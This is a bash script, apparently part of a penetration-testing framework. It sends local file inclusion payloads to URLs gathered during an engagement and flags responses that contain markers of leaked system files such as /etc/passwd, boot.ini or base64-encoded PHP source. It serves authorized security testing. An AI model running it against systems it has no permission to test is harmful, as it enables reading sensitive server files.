#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"; BASE_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
source "$SCRIPT_DIR/../lib.sh"
CLASS=lfi; PAYLOADS="$SCRIPT_DIR/payloads.txt"
ENGAGEMENT="${1:?Usage: $0 <engagement-id> [urls-file] [max-payloads]}"
URLS_FILE="${2:-$BASE_DIR/runtime/engagements/$ENGAGEMENT/recon/urls/lfi.txt}"
MAX="${3:-200}"
HITS_DIR="$BASE_DIR/runtime/engagements/$ENGAGEMENT/recon/hits/$CLASS"
mkdir -p "$HITS_DIR"
[ ! -f "$PAYLOADS" ] && err "Missing $PAYLOADS" && exit 1
[ ! -f "$URLS_FILE" ] && err "Missing $URLS_FILE" && exit 1
pat_ref "lfi"

detect() {
  local body="$1"
  local -a markers=(
    "root:x:0:0" "bin:x:1:1" "daemon:x:2:2"
    "bash" "nologin" "/sbin/nologin"
    "\[boot loader\]" "\[fonts\]" "\[extensions\]"
    "Microsoft Windows" "Windows NT"
    "; for 16-bit app support"
    "PHP" "0;}//" "// END"
    "PGh0bWw" "UEQ" "YWRtaW4"  # base64 patterns
  )
  for m in "${markers[@]}"; do echo "$body" | grep -qi "$m" 2>/dev/null && return 0; done
  [ -n "$(echo "$body" | tr -d '[:space:]')" ] && [ "$(echo "$body" | wc -c)" -gt 50 ] && return 0
  return 1
}

TOTAL=0; HIT_COUNT=0
while IFS= read -r url || [ -n "$url" ]; do
  [ -z "$url" ] && continue
  info "Testing $url"
  param=$(echo "$url" | grep -oP '(?<=\?|&)[^=]+(?==)' | head -1)
  local_hits=0; count=0
  while IFS= read -r payload || [ -n "$payload" ]; do
    [ -z "$payload" ] && continue; count=$((count + 1))
    [ "$count" -gt "$MAX" ] && break
    test_url=$(inject_payload "$url" "$payload")
    tmpf=$(mktemp); resp=$(fetch_url "$test_url" "$tmpf")
    status=$(echo "$resp" | awk '{print $1}'); body=$(cat "$tmpf" 2>/dev/null || true); rm -f "$tmpf"
    if [ "$status" != "404" ] && [ "$status" != "000" ] && detect "$body"; then
      local_hits=1; safe=$(echo "$url" | sed 's|https\?://||;s/[^a-zA-Z0-9]/_/g')
      echo "$payload" >> "$HITS_DIR/${safe}_${param}.txt"
      log "HIT on $param (status $status, size ${#body})"
      break
    fi
    TOTAL=$((TOTAL + 1))
  done < "$PAYLOADS"
  [ "$local_hits" -eq 1 ] && HIT_COUNT=$((HIT_COUNT + 1))
done < "$URLS_FILE"
log "LFI done: $HIT_COUNT URLs with hits"
exit "$HIT_COUNT"
